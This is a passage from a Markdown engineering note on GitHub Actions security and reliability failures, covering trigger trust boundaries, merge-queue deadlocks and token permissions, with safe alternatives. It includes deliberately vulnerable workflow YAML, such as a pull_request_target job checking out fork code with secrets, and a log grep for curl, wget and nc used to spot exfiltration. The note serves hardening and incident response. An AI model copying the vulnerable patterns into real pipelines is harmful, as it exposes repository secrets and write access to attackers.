---
title: "05 - GitHub Actions Problems"
tags:
  - github-actions
  - ci-cd
  - security
  - troubleshooting
---

# GitHub Actions Problems

> [!quote]+
>
> "We found that where code deployments are most painful, you'll find the poorest software delivery performance, organizational performance, and culture."

> [!abstract]- Summary
>
> Catalogs GitHub Actions failure modes as operational and security incidents, showing how trigger choice, trust boundaries, expression handling, cache and artifact flow, deployment concurrency, runner hygiene, supply-chain controls, and governance gaps break distributed teams in predictable ways.
>
> **Failure taxonomy and trigger trust boundaries**
> - Defines the core problem vocabulary, then covers trigger and event mistakes such as `pull_request_target`, `workflow_run`, `merge_group`, rerun semantics, and matrix explosion as the first layer of high-impact workflow failure
> - Connects each failure class to trust context, token scope, queue behavior, and blast radius instead of treating broken runs as isolated YAML bugs
>
> **Execution, data flow, and runner failures**
> - Covers permissions misuse, shell injection, expression abuse, stale or poisoned caches, artifact flow problems, deployment races, self-hosted runner persistence, and supply-chain risks from third-party actions
> - Explains why these failures compound in distributed teams where workflow YAML, secrets, and deployment rights all live next to the same repository code
>
> **Governance and data-platform consequences**
> - Extends the problem set to governance, ownership, review failures, and data-engineering-specific cost and blast-radius incidents where CI mistakes become production, compliance, or spend-control problems
> - Adds operational diagnostics, related notes, and reference material so incident response starts from a known taxonomy instead of ad-hoc debugging
>
> **Operations and safety**
> - Warnings: privileged fork execution, over-broad OIDC subject claims, mutable action tags, poisoned caches, deployment deadlocks, persistent self-hosted state, and production-cost explosions from unsafe data workflows
> - Recommendations: split privileged from unprivileged workflows, scope tokens and environments tightly, pin third-party actions, treat caches and runners as trust boundaries, and review workflow changes with the same rigor as application code
> - Troubleshooting: failure-class-driven diagnosis across trigger misuse, permission gaps, injection, data-flow corruption, concurrency deadlock, runner compromise, governance drift, and warehouse-cost incidents

> [!note]- Glossary
>
> **`pull_request_target`**
> - Trigger that runs in the base-branch context (with secrets), designed for privileged PR operations from forks. Dangerous when combined with `actions/checkout` referencing the PR HEAD.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **`merge_group`**
> - Trigger that fires when a PR enters the merge queue. Required alongside `pull_request` for required status checks to work in repos using merge queues.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **`workflow_run`**
> - Trigger that fires when another workflow completes. Runs in the base-branch context, allowing access to secrets — a widened trust boundary if the triggering workflow is untrusted.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **`GITHUB_TOKEN`**
> - Automatically created short-lived token scoped to the repository. Permissions are configurable per-job; default varies by org policy (read-only or write-all).
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **`OIDC`**
> - OpenID Connect. Allows workflows to authenticate to cloud providers without storing long-lived credentials as secrets. Requires `id-token: write` permission and correct subject claim configuration.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Subject claim**
> - The `sub` field in an OIDC token that the cloud provider validates. Over-broad subjects (e.g., just `repo:org/repo`) allow any workflow in that repo to assume the role, not only the intended ones.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **SHA pinning**
> - Referencing third-party actions by their full commit SHA rather than a mutable tag. Prevents tag-moving attacks but creates maintenance overhead.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Mutable tag**
> - A Git tag that the action owner can move to point to different code. Using `@v4` instead of `@<SHA>` means the action can silently change between runs.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!info] Operational nuance
> >
> > Treat this as a concrete GitHub Actions object, runtime surface, or workflow control rather than as a loose synonym. The surrounding YAML behaves differently depending on this exact meaning.
>
> ---
>
> **Action cache**
> - Storage layer for `actions/cache`. Scoped per branch and per repo by default. Stale or poisoned entries can persist across runs within the same branch until explicitly evicted.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Artifact attestation**
> - Cryptographic provenance record binding a build artifact to its source workflow run, signing key, and SHA. Generated by `actions/attest-build-provenance`.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **SLSA**
> - Supply-chain Levels for Software Artifacts. A framework for evaluating build pipeline integrity. SLSA Level 2 requires hermetic builds with signed provenance.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Concurrency group**
> - A string key that identifies a set of workflow runs that should not run simultaneously. Set via `concurrency:`.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **`cancel-in-progress`**
> - Concurrency option. `true` cancels the running instance when a new one starts; `false` queues the new instance.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Environment**
> - A named deployment target in GitHub (e.g., `staging`, `production`). Can have protection rules: required reviewers, deployment branch policies, wait timers.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Required reviewer**
> - A user or team that must approve a job referencing an environment with `required_reviewers` before the job proceeds.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Self-hosted runner**
> - A runner machine operated by the user's org rather than GitHub. Can be persistent (long-lived) or ephemeral (JIT). Persistent runners retain disk state between jobs.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **JIT runner**
> - Just-in-time ephemeral runner registered for a single job and terminated afterward. Eliminates state persistence risk.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Runner group**
> - A collection of self-hosted runners with access policies controlling which repositories can use them.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **`actionlint`**
> - Static analysis tool for GitHub Actions workflows. Detects injection vulnerabilities, expression type errors, undefined outputs, and permission misconfigurations.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **`zizmor`**
> - Security-focused static analysis tool for GitHub Actions. Detects `pull_request_target` misuse, `workflow_run` trust widening, injection, and over-broad permissions.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Reusable workflow**
> - A workflow that can be called from another workflow using `uses:` with a `workflow_call` trigger. Runs as a separate job. Secrets must be explicitly passed.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Composite action**
> - An action that groups multiple steps into a reusable unit. Runs inline in the caller's job context, inheriting the caller's environment and secrets automatically.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Blast radius**
> - The scope of systems, data, and operations that a failure mode can affect if exploited or triggered.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **``merge_group` deadlock`**
> - A state where PRs in the merge queue cannot complete because the required status check is not configured to run on the `merge_group` event, so the queue waits indefinitely.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **Matrix explosion**
> - A matrix strategy where dimension multiplication produces far more jobs than intended, exhausting concurrency limits and accumulating excessive CI minutes.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Command injection**
> - An attack where user-controlled data (PR title, branch name, commit message) is interpolated directly into a `run:` step using `${{ }}`, allowing the attacker to execute arbitrary shell commands.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Evaluation scope matters
> >
> > GitHub Actions resolves different values at different times and scopes. Confusing workflow-processing state with shell runtime state is a common source of broken YAML and misleading conditions.
>
> ---
>
> **`::add-mask::`**
> - A workflow command that instructs the runner to redact a specific string from all subsequent log output. Required for any derived value computed from a secret.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Rerun semantics**
> - When re-running a workflow or individual jobs, GitHub reuses the same SHA, ref, and artifacts from the original run. Steps do not re-checkout code or regenerate artifacts unless the full workflow is re-triggered.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!warning] Operational blast radius
> >
> > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
>
> ---
>
> **Cache poisoning**
> - Insertion of malicious or incorrect content into the Actions cache such that future runs restore the compromised state. Relevant in high-privilege workflows sharing a cache key with low-trust branches.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening depend on choosing this mechanism deliberately instead of treating nearby GitHub Actions features as interchangeable.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.
>
> ---
>
> **Provenance**
> - Metadata describing how an artifact was built: the source repo, commit SHA, workflow, and build inputs. Verified by consumers to establish trust before deployment.
> - It matters in this note because the workflows for GitHub Actions failure modes, trust-boundary mistakes, runner risk, and incident-oriented workflow hardening read, scope, or constrain this part of the Actions runtime directly, and misunderstanding it leads to the wrong safety or execution assumption.
>
> > [!danger] Security boundary
> >
> > This term affects trust, identity, or supply-chain integrity. Scope it deliberately and avoid broad defaults that let untrusted workflow code inherit high privilege.


## Trigger choices that create security and correctness failures

Trigger misconfiguration is the most common entry point for both security failures and silent operational breakage. The root cause is that GitHub's trigger model has non-obvious trust semantics: different event types run in different contexts, with different secret access and different `GITHUB_TOKEN` scopes.

### triggers | pull_request_target misuse

**What happens:** An attacker opens a PR from a fork. If the workflow uses `pull_request_target` and checks out the PR's code (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`), the untrusted code runs in the base branch's context — with full access to repository secrets and a write-scoped `GITHUB_TOKEN`. This is not theoretical: a real-world worm infected 20,000+ repositories and 1,700 npm packages via this exact pattern. The attacker exfiltrates secrets, pushes malicious commits, and moves laterally to other org repos.

**Why it happens:** `pull_request_target` was introduced to allow privileged operations (labeling, commenting) on fork PRs, which `pull_request` cannot do because forks run without secrets. The trigger runs in the context of the base branch, which has secrets. If the PR HEAD is then explicitly checked out, attacker-controlled code runs with trusted credentials. GitHub documents the risk, but the pattern is intuitive enough that engineers reach for it repeatedly.

**Symptoms:**

- Workflows that add labels, comments, or perform CI operations on fork PRs use `pull_request_target`
- `actions/checkout` in those workflows has `ref: ${{ github.event.pull_request.head.sha }}`
- `zizmor .github/workflows/` reports `pull_request_target` violations

**Blast radius:** Repository secrets (API keys, SA credentials, signing keys) exfiltrated; malicious commits pushed to main via write-scoped token; lateral movement to other repos via org-level secrets; supply chain compromise of published packages; regulatory exposure if secrets include credentials to financial data systems.

#### Detect pull_request_target misuse in the codebase

During a security audit or after onboarding a workflow that handles fork PRs. It is typically triggered by periodic review of `.github/workflows/` or after any PR adding a new workflow file. Local shell, read-only filesystem scan. Identify all workflows using `pull_request_target` and assess whether any pair it with unsafe checkout.

*Scan all workflows for pull_request_target usage.*

```bash
grep -rn "pull_request_target" .github/workflows/
```

```text
# If output contains a file, inspect it for unsafe checkout pattern:
grep -A 20 "pull_request_target" .github/workflows/<file>.yml | grep "ref:"
# Any ref: pointing to github.event.pull_request.head.sha is the dangerous pattern
```

> [!danger] Unsafe pull_request_target checkout
>
> ```yaml
> # DANGEROUS: runs attacker code with full secrets access
> on:
>   pull_request_target:
>     types: [opened, synchronize]
>
> jobs:
>   test:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
>         with:
>           ref: ${{ github.event.pull_request.head.sha }}  # attacker controls this
>       - run: npm test  # attacker's code runs with YOUR secrets
> ```

> [!success] Safe pattern — split unprivileged and privileged workflows
>
> ```yaml
> # Workflow 1: ci-pull-request.yml (unprivileged — runs in fork context, no secrets)
> on:
>   pull_request:
>     types: [opened, synchronize]
>
> jobs:
>   test:
>     runs-on: ubuntu-latest
>     permissions:
>       contents: read
>     steps:
>       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
>       - run: npm ci && npm test
>       - uses: actions/upload-artifact@6f51ac03b9356f520e9adb1b1b7802705f340c2d  # v4.5.0
>         with:
>           name: test-results-${{ github.run_id }}
>           path: test-results/
>
> # Workflow 2: ci-label-on-pass.yml (privileged — triggered after workflow_run completes)
> on:
>   workflow_run:
>     workflows: ["CI - Pull Request"]
>     types: [completed]
>
> jobs:
>   label:
>     runs-on: ubuntu-latest
>     permissions:
>       pull-requests: write
>     if: ${{ github.event.workflow_run.conclusion == 'success' }}
>     steps:
>       - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7
>         with:
>           script: |
>             github.rest.issues.addLabels({
>               owner: context.repo.owner,
>               repo: context.repo.repo,
>               issue_number: context.payload.workflow_run.pull_requests[0].number,
>               labels: ['ci-passed']
>             });
> ```

**Prevention protocol:**

1. Audit all workflows for `pull_request_target` — run `grep -rn "pull_request_target" .github/workflows/`
2. If `pull_request_target` is needed, never pair it with `actions/checkout` referencing the PR HEAD
3. Set `permissions: {}` at the workflow level by default, grant minimally per-job
4. Pin all third-party actions to commit SHA — mutable tags allow silent code substitution
5. Enable "Require approval for all outside collaborators" in Settings → Actions → General
6. Add `zizmor` as a required CI check: `pip install zizmor && zizmor .github/workflows/`

**Immediate response if compromised:**

1. Rotate ALL repository and org-level secrets immediately — assume every secret was exfiltrated
2. Audit `git log --all --oneline` for unauthorized commits from the Actions bot
3. Check npm/PyPI/Docker registries for package versions published during the exposure window
4. Download and grep all Actions logs for outbound network calls: `gh run view <id> --log | grep -E "curl|wget|nc "`
5. Enable secret scanning with push protection in Settings → Security

**Long-term remediation:**

- Add `zizmor` and `actionlint` as required checks on every PR touching `.github/workflows/`
- Configure Dependabot weekly for `github-actions` package ecosystem to surface SHA drift
- Conduct a quarterly workflow security review; publish findings to the platform team

### triggers | missing merge_group causes queue deadlock

**What happens:** A repo enables the merge queue feature (Settings → Branches → Require merge queue). The required status check `required-check` is listed in the branch protection rules. The workflow that runs `required-check` only has `on: pull_request`. When a PR enters the merge queue, GitHub fires the `merge_group` event — not `pull_request`. The workflow never runs, the check never reports a result, and the merge queue waits indefinitely. The queue appears frozen; PRs accumulate without merging.

**Why it happens:** `merge_group` is a distinct event type introduced for merge queues. It is not a variant of `pull_request`. A workflow that does not list `merge_group` as a trigger simply does not fire when the queue processes a batch. GitHub does not fail the check or report an error — it just never posts a result, and the queue's required check waits for a result that will never arrive.

**Symptoms:**

- PRs enter the merge queue but never merge — queue grows without progressing
- The required check shows no status (neither pending, passing, nor failing) for queued batches
- `gh run list` shows no `merge_group`-triggered runs for the affected workflow

**Blast radius:** All open PRs targeting the protected branch are blocked from merging. In a data engineering repo, this means schema migrations, pipeline updates, and dependency bumps accumulate unmerged. Emergency fixes to production pipelines cannot ship through the standard process.

#### Add merge_group trigger to required-check workflow

When enabling the merge queue for a branch, or when diagnosing a frozen queue. It is typically triggered by merge queue configured but PRs not progressing; `gh run list` shows no merge_group runs. Workflow YAML edit. Safe to apply to any CI workflow that gatekeeps merges. Ensure the required status check fires on the `merge_group` event so the queue can proceed.

The following workflow was committed to `alp78/git-lab` and triggered via push (run 24314561252, 6s).

*Workflow covering push, pull_request, and merge_group events with a unified required-check job.*

```yaml
name: "Demo: Problems | merge_group trigger"

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  merge_group:
    branches: [main]

jobs:
  required-check:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - name: Report trigger context
        run: |
          echo "Event name: $GITHUB_EVENT_NAME"
          echo "Ref:        $GITHUB_REF"
          echo "SHA:        $GITHUB_SHA"
          case "$GITHUB_EVENT_NAME" in
            push)         echo "Running as: direct push to main" ;;
            pull_request) echo "Running as: pull request CI check" ;;
            merge_group)  echo "Running as: merge queue batch check" ;;
          esac
      - name: Validate code (simulated)
        run: |
          echo "lint: PASS"
          echo "typecheck: PASS"
          echo "unit-test: PASS"
          echo "All required checks passed for event: $GITHUB_EVENT_NAME"
```

*Workflow run output (run 24314561252, triggered by push to main, SHA d030c26):*

```text
# captured from: gh run view 24314561252 --log
✓ required-check in 6s (ID 70989918148)

Event name:    push
Ref:           refs/heads/main
SHA:           d030c26efc3a166909b0ac321fb04aefc96d9817
Actor:         alp78

Running as: direct push to main
=== Simulated validation ===
Running required checks...
  lint:      PASS
  typecheck: PASS
  unit-test: PASS
All required checks passed for event: push
```

> [!warning] merge_group event not in trigger list causes silent deadlock
>
> If `merge_group` is absent from the `on:` block, GitHub fires the event but finds no matching workflow. The required check never posts a status. The queue enters an infinite wait. There is no error — just silence. A branch protection check that requires a named status check from a workflow is only fulfilled if that workflow actually runs on the relevant event.

> [!success] List merge_group alongside pull_request in every required-check workflow
>
> Add `merge_group:` with the same `branches:` filter used for `pull_request`. The same job can handle all three triggers (`push`, `pull_request`, `merge_group`) using a single `case` on `$GITHUB_EVENT_NAME` to log context if needed.

**Prevention protocol:**

1. When enabling merge queue, audit all required status checks and verify their triggering workflows include `merge_group`
2. Test: manually queue a PR and confirm the required check appears and passes
3. Add a CI check that validates `merge_group` presence: `grep -L "merge_group" .github/workflows/*.yml` should produce no output for workflows used as required checks

**Immediate response:** Add `merge_group:` to the `on:` block of the required-check workflow and push. Existing queued PRs will be retried automatically once the check passes.

**Long-term remediation:** Document the merge queue setup in the repo's contributing guide. Include `merge_group` in the CI template that teams copy when adding a new required check.

### triggers | workflow_run trust boundary widening

**What happens:** A workflow uses `on: workflow_run` to trigger after a PR CI workflow completes. The `workflow_run` trigger executes in the base branch context — with access to repository secrets — regardless of whether the triggering workflow ran on a fork PR. An engineer configures the `workflow_run` workflow to perform a cloud deployment or label operation, accidentally giving fork-PR-triggered code an indirect path to privileged operations.

**Why it happens:** `workflow_run` is designed for the split-workflow pattern (see `pull_request_target` section). However, if the `workflow_run` workflow downloads artifacts from the triggering run and executes their contents, or if it does not validate the triggering workflow's event type, it exposes privileged operations to untrusted inputs.

**Symptoms:**

- A `workflow_run` workflow performs privileged operations (deploy, label, comment) without validating `github.event.workflow_run.event`
- Artifacts from fork-PR CI runs are downloaded and processed in a privileged context

**Blast radius:** Same as `pull_request_target` misuse — secrets exfiltration, repository write access abuse.

> [!danger] workflow_run without event-type guard
>
> ```yaml
> on:
>   workflow_run:
>     workflows: ["CI"]
>     types: [completed]
>
> jobs:
>   deploy:
>     # MISSING: check that the triggering workflow ran on a trusted event
>     # This runs on workflow_run from ANY triggering event, including fork PRs
>     steps:
>       - uses: actions/download-artifact@fa0a91b85d4f404e444306234fdfd2fc898be651  # v4.1.8
>         with:
>           run-id: ${{ github.event.workflow_run.id }}
>           github-token: ${{ secrets.GITHUB_TOKEN }}
>       - run: ./process-artifact.sh   # processes attacker-controlled content with secrets
> ```

> [!success] Guard workflow_run with event-type and conclusion checks
>
> ```yaml
> jobs:
>   deploy:
>     if: |
>       github.event.workflow_run.conclusion == 'success' &&
>       github.event.workflow_run.event == 'push' &&
>       github.event.workflow_run.head_branch == 'main'
>     # Only proceed if the triggering run was a push to main — not a fork PR
> ```

**Prevention protocol:**

1. Every `workflow_run` job must guard with `if:` checking `github.event.workflow_run.event` and `head_branch`
2. Never process artifact content from a `workflow_run` triggered by `pull_request` — the artifact may contain attacker-supplied code
3. Run `zizmor` — it detects `workflow_run` trust widening patterns

## Permission mistakes that widen the blast radius

Permissions failures compound other vulnerabilities: an injection attack that would otherwise have limited impact becomes catastrophic when the workflow runs with `write-all` permissions.

### permissions | broad GITHUB_TOKEN permissions

**What happens:** A workflow fails with `403 Resource not accessible by integration`. The developer adds `permissions: write-all` to resolve the error without investigating which specific permission was needed. The token now has maximum privileges for the entire workflow. If any step in that workflow is later exploited (injection, compromised action), the attacker has full write access to the repo, packages, deployments, and issues.

**Why it happens:** GitHub changed the default `GITHUB_TOKEN` permissions to read-only for new repos in 2023, but many existing repos retain write-all defaults. Workflows copied from Stack Overflow or older examples assume broad permissions. The permission model has two levels (workflow-level and job-level) — job-level overrides workflow-level, which is non-obvious.

**Symptoms:**

- Workflows with `permissions: write-all` or no `permissions:` block in orgs with write-all defaults
- `403` errors resolved by permission expansion rather than targeted grants

> [!warning] Broad permission anti-pattern
>
> ```yaml
> # BAD: write-all to fix a 403 without investigation
> permissions: write-all
>
> # BAD: no permissions block (relies on org default, which may be write-all)
> jobs:
>   deploy:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@v4   # implicitly uses write-all if org default is broad
> ```

> [!success] Least-privilege: deny all at workflow level, grant per job
>
> ```yaml
> permissions: {}   # deny everything at workflow level
>
> jobs:
>   test:
>     permissions:
>       contents: read    # checkout only
>   release:
>     permissions:
>       contents: write   # push tags/releases
>       packages: write   # push to GHCR
>       id-token: write   # OIDC for keyless cloud auth
>   comment:
>     permissions:
>       pull-requests: write  # post PR comments
> ```

| Permission scope | Required for | Common mistake |
|---|---|---|
| `contents: read` | `actions/checkout` | Omitting — relies on default |
| `contents: write` | Push commits, create releases, upload release assets | Using `write-all` instead |
| `packages: write` | Push to GitHub Container Registry | Forgotten for GHCR push |
| `id-token: write` | OIDC authentication to cloud | Omitting — OIDC fails silently |
| `pull-requests: write` | Post PR comments, add labels | Setting at workflow level instead of per-job |
| `issues: write` | Create/comment on issues | Granting when only read is needed |
| `security-events: write` | Upload SARIF results | Omitting — code scanning upload fails |
| `deployments: write` | Create deployments | Often not needed — use environments instead |

**Prevention protocol:**

1. Set org-level default to read-only: Settings → Actions → General → "Read repository contents and packages permissions"
2. Always specify explicit `permissions:` in every workflow — `actionlint` enforces this
3. When a `403` occurs, read the error message for the specific permission, not `write-all`
4. For OIDC, `id-token: write` is required — document this for the team

**Immediate response:** Identify the specific permission causing the `403`, add only that permission at the job level, remove `write-all`.

**Long-term remediation:** Add `actionlint` as a required check configured to flag missing `permissions:` blocks. Audit all existing workflows: `grep -rL "permissions:" .github/workflows/`.

### permissions | OIDC subject claim misconfiguration

**What happens:** A team sets up Workload Identity Federation so GitHub Actions can authenticate to GCP without storing service account keys. The WIF pool's attribute condition is configured with an overly broad subject claim: `attribute.repository == 'org/repo'`. This allows any workflow in that repository — any branch, any trigger, any job name — to assume the service account. An attacker who can push a branch or open a fork PR gains cloud access if they can trigger any workflow.

